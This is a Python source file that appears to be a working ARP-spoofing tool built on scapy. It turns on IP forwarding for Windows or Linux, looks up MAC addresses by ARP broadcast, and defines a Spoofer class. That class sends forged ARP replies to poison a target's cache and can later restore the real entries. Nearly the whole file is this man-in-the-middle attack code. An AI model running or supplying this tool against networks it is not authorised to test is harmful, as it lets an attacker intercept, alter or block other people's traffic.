from scapy.all import ARP, Ether, send, srp


def enableIPRoute(os):
    print("OS detected: ", os)
    if os == "Windows":
        from windows_ip_router import IP_Router
        router = IP_Router()
        router.start()
        print("IP routing enabled.")
    elif os == "Linux":
        from linux_ip_router import enable_linux_iproute
        enable_linux_iproute()
        print("IP routing enabled.")
    else:
        print("This code does not support the given OS :(")
        exit()


def getMac(ip, interface=None):
    # Initiates an ARP resolution between your machine and the target machine.
    # Tells the wifi router to ask "Who has <ip>? Respond with your MAC address."
    # Your IP is sent in this request by default so that the response is directly sent to your machine.
    arp_frame = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
    if interface:
        ans, _ = srp(arp_frame, iface=interface, timeout=3, verbose=0)
    else:
         ans, _ = srp(arp_frame, timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    

class Spoofer:

    def __init__(self, con_mode):
        self.connection_mode = con_mode
        self.interface = ""
        if self.connection_mode == "wifi":
            self.interface = input("Please enter your wifi interface: ")
        elif self.connection_mode == "eth":
            pass


    def spoof(self, target_ip, spoofed_ip):
        
        target_mac = ""
        if self.connection_mode == "wifi":
            target_mac = getMac(target_ip, self.interface)
        elif self.connection_mode == "eth":
            target_mac = getMac(target_ip)

        spoofed_arp_ipv4 = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc="00:00:00:00:00:00", op=2)
        
        send(spoofed_arp_ipv4, verbose=1)
        print("Spoofed ARP sent to IPv4", target_ip, "with MAC", target_mac)
        

    def unspoof(self, target_ip, real_ip):
        target_mac = getMac(target_ip)
        real_mac = getMac(real_ip)
        unspoofing_arp_ipv4 = ARP(pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac, op=2)
        send(unspoofing_arp_ipv4, verbose=1, count=7)
        print("Original ARPs restrored.")

